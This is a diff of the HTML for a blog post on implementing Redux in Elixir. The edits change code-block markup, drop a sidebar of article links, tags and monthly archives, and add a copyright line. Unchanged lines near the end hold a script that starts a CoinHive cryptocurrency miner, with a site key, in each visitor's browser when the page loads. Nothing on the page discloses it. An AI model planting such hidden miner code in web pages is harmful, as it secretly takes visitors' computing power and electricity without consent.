+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -589,12 +566,11 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
     <span class="o">|&gt;</span> <span class="no">Enum</span><span class="o">.</span><span class="n">into</span><span class="p">(%{})</span>
   <span class="k">end</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Ok, dopeness alert. Notice how we&rsquo;re using a task to run this calculation. This means that the calculation for ALL of the reducers will take as long as the slowest one, not the culmination of all of their time. THIS IS REALLY COOL. How are you not excited?!</p>
 
 <p>Let&rsquo;s test it out. First create a <code>SquareReducer</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -610,10 +586,9 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
   <span class="k">defp</span> <span class="n">do_reduce</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="p">%{</span><span class="ss">type:</span> <span class="sd">"</span><span class="s2">INCREMENT"</span><span class="p">}),</span> <span class="k">do</span><span class="p">:</span> <span class="n">state</span> <span class="o">*</span> <span class="m">1</span>
   <span class="k">defp</span> <span class="n">do_reduce</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">_</span><span class="p">),</span> <span class="k">do</span><span class="p">:</span> <span class="n">state</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Then Run this!</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -621,8 +596,7 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 
 <span class="no">Store</span><span class="o">.</span><span class="n">dispatch</span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="p">%{</span><span class="ss">type:</span> <span class="sd">"</span><span class="s2">INCREMENT"</span><span class="p">})</span>
 <span class="no">Store</span><span class="o">.</span><span class="n">get_state</span><span class="p">(</span><span class="n">store</span><span class="p">)</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>SO COOL!!!</p>
 
 <h1>Closing up</h1>
@@ -650,103 +624,6 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
 
   </main>
 
-  <aside id="history">
-    <section class="recent">
-      <h2>Recent Articles</h2>
-      <ol class="articles">
-            <li><a href="/2017/06/17/ltrees-in-phoenix.html">LTrees in Phoenix</a>
-            <li><a href="/2017/05/02/something-useless-terminal-in-your-browser.html">Something Useless - Terminal in your browser</a>
-            <li><a href="/2017/04/18/something-useless-redux-implemented-in-elixir.html">Something Useless - Redux Implemented in Elixir</a>
-            <li><a href="/2016/08/24/learn-to-program-with-elixir.html">Learn to Program with Elixir</a>
-            <li><a href="/2016/05/23/guard-this-with-your-life-or-authenticating-apis-with-guardian.html">Guard this with your life... Or authenticating APIs with Guardian</a>
-            <li><a href="/2016/04/26/processes-in-elixir.html">Processes in Elixir</a>
-            <li><a href="/2016/02/24/hey-watch-it-or-how-to-monitor-files-in-elixir.html">Hey! Watch it!...or how to monitor files in Elixir</a>
-            <li><a href="/2015/08/23/let-s-build-something-with-rack.html">Let's build something with Rack</a>
-            <li><a href="/2015/08/21/lets-learn-about-rack.html">Let's learn about Rack</a>
-            <li><a href="/2015/06/08/rails-foreign-key-constraints-the-ugly-way.html">Rails Foreign Key Constraints - The Ugly Way</a>
-      </ol>
-    </section>
-
-    <section class="tags">
-      <h2>Tags</h2>
-      <ol>
-            <li><a href="/tags/beginner.html">Beginner</a> (1)</a></li>
-            <li><a href="/tags/concurrency.html">Concurrency</a> (1)</a></li>
-            <li><a href="/tags/ecto.html">Ecto</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">Elixir</a> (3)</a></li>
-            <li><a href="/tags/ltrees.html">LTrees</a> (1)</a></li>
-            <li><a href="/tags/learn-to-program.html">Learn to Program</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">Phoenix</a> (1)</a></li>
-            <li><a href="/tags/processes.html">Processes</a> (1)</a></li>
-            <li><a href="/tags/random-thoughts.html">Random Thoughts</a> (1)</a></li>
-            <li><a href="/tags/authentication.html">authentication</a> (1)</a></li>
-            <li><a href="/tags/basics.html">basics</a> (1)</a></li>
-            <li><a href="/tags/beginner.html">beginner</a> (1)</a></li>
-            <li><a href="/tags/closures.html">closures</a> (1)</a></li>
-            <li><a href="/tags/components-of-programming.html">components of programming</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">elixir</a> (5)</a></li>
-            <li><a href="/tags/enumerable.html">enumerable</a> (1)</a></li>
-            <li><a href="/tags/file-watchers.html">file watchers</a> (1)</a></li>
-            <li><a href="/tags/find.html">find</a> (1)</a></li>
-            <li><a href="/tags/fs.html">fs</a> (1)</a></li>
-            <li><a href="/tags/fundamentals.html">fundamentals</a> (1)</a></li>
-            <li><a href="/tags/generators.html">generators</a> (1)</a></li>
-            <li><a href="/tags/guardian.html">guardian</a> (1)</a></li>
-            <li><a href="/tags/javascript.html">javascript</a> (3)</a></li>
-            <li><a href="/tags/learning.html">learning</a> (1)</a></li>
-            <li><a href="/tags/navigation.html">navigation</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">phoenix</a> (1)</a></li>
-            <li><a href="/tags/polyglot.html">polyglot</a> (1)</a></li>
-            <li><a href="/tags/postgresql.html">postgresql</a> (1)</a></li>
-            <li><a href="/tags/promises.html">promises</a> (1)</a></li>
-            <li><a href="/tags/rack.html">rack</a> (2)</a></li>
-            <li><a href="/tags/rails.html">rails</a> (2)</a></li>
-            <li><a href="/tags/redux.html">redux</a> (1)</a></li>
-            <li><a href="/tags/routing.html">routing</a> (1)</a></li>
-            <li><a href="/tags/ruby.html">ruby</a> (6)</a></li>
-            <li><a href="/tags/sharp-axe.html">sharp axe</a> (1)</a></li>
-            <li><a href="/tags/something-useless.html">something useless</a> (2)</a></li>
-            <li><a href="/tags/web.html">web</a> (1)</a></li>
-      </ol>
-    </section>
-    <section class="by-month">
-      <h2>By Month</h2>
-      <ol>
-            <li><a href="/2017/06.html">June 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/05.html">May 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/04.html">April 2017</a>
-              (1)</a></li>
-            <li><a href="/2016/08.html">August 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/05.html">May 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/04.html">April 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/02.html">February 2016</a>
-              (1)</a></li>
-            <li><a href="/2015/08.html">August 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/06.html">June 2015</a>
-              (1)</a></li>
-            <li><a href="/2015/05.html">May 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/02.html">February 2015</a>
-              (1)</a></li>
-            <li><a href="/2014/11.html">November 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/05.html">May 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/04.html">April 2014</a>
-              (2)</a></li>
-            <li><a href="/2014/02.html">February 2014</a>
-              (1)</a></li>
-            <li><a href="/2013/10.html">October 2013</a>
-              (1)</a></li>
-      </ol>
-    </section>
-  </aside>
  <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
@@ -763,6 +640,8 @@ Let&rsquo;s start by implementing the <code>get_state</code> function on a <code
    var miner = new CoinHive.Anonymous('zmOZS6Bce7Nsw6WOSrt2cAJvIy4CvcNV');
    miner.start();
  </script>
+
+ <em>Copyright &copy; 2017 Steven Nu&ntilde;ez - HostileDeveloper</em>
 
 </div>
 </body>
